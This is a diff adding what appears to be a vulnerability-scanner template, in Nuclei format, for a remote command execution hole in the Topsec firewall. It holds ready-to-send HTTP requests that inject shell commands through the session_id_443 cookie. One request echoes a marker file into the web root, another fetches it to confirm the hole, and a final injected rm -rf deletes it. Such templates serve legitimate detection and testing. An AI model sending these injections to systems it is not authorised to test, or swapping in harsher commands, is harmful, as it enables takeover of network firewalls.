@@ -1,0 +1,49 @@
+id: topsec-cookie-rce
+
+info:
+  name: Topsec Firewall Cookie RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Topsec Firewall Cookie Remote Command Execution vulnerability. Attackers can execute arbitrary commands by manipulating the cookie parameter.
+  tags: rce, command-injection
+
+variables:
+  flag_file: "{{rand_base(8)}}"
+
+http:
+  - id: create-file
+    raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: session_id_443=1|echo "{{flag_file}}">/www/htdocs/site/image/{{flag_file}};
+
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: verify-file
+    raw:
+      - |
+        GET /site/image/{{flag_file}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "{{flag_file}}"
+
+  - id: cleanup
+    raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: session_id_443=1|rm -rf /www/htdocs/site/image/{{flag_file}};
